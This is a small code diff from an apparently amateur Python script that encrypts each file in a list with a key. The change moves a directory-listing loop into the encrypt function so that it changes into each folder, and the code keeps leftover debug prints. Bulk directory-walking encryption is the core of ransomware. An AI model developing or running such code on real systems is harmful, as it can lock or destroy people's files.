@@ -38,17 +38,17 @@ def backencrypt(filename, key):
 def encrypt(key):
     for i in files:
         backencrypt(i, key)
-
-
-for g in directory:
-    array = os.listdir(g)
-    print("array!!!!!11111" ,array)
-    filesd = []
-    directoryd = []
-    for i in range(0, len(array)):
-        if os.path.isfile(array[i]):
-            filesd.append(array[i])
-        else:
-            print(directoryd.append(array[i]))
-    print(f"files: {filesd} \n dir: {directoryd}")
+    
+    for g in directory:
+        os.chdir(g)
+        array = os.listdir()
+        print("array!!!!!11111" ,array)
+        filess = []
+        directorys = []
+        for i in range(0, len(array)):
+            if os.path.isfile(array[i]):
+                filess.append(array[i])
+            else:
+                print(directorys.append(array[i]))
+        print(f"files: {filess} \n dir: {directorys}")
 
